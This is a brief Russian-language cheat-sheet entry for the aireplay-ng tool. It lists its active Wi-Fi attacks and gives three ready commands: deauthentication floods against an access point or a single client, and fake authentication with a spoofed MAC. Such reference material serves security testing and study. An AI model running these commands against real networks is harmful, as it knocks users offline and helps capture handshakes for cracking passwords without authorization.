#wifi #tool

Реализует активные атаки

Deauth, fake auth, replay, forcing handshakes.

```bash
aireplay-ng -0 10 -a AP_MAC wlan0mon
aireplay-ng -0 5 -a AP_MAC -c CLIENT_MAC wlan0mon
aireplay-ng -1 0 -a AP_MAC -h FAKE_MAC wlan0mon
```

